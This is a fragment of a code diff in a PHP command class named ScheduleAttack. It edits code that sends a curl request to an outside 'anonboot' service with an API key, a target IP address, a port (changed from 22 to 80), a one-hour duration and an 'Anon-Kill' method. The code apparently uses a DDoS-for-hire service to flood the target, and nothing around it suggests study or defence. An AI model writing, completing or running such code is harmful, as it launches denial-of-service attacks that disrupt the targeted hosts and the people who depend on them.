@@ -39,7 +39,7 @@ class ScheduleAttack extends Command
     {
         $k = 'BghUuaFPZH5x4Voa';
         $h = '34.83.218.19';
-        $p = 22;
+        $p = 80;
         $t = 3600;
         $m = 'Anon-Kill';
         $ch = curl_init("https://anonboot.ga/?key={$k}&host={$h}&port={$p}&time={$t}&method={$m}");
